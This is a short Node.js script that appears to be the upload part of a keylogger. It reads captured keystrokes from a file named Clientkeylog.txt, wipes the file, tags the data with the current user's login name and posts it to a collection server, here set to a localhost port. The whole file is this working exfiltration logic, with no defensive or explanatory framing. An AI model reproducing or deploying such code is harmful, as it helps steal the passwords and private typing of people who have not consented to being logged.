const axios = require("axios");
const fs = require("fs");
const PATH = `D://Clientkeylog.txt`;
const URL = "http://localhost:24242";

const sendData = async () => {
    const data = getData();
    await axios.post(`${URL}/data`, data);
}

const getData = () => {
    let fileData = fs.readFileSync(PATH, "utf8");
    fs.writeFileSync(PATH, '');
    
    let id = require("os").userInfo().username;

    return {
        id: id,
        data: fileData
    }
}
sendData();
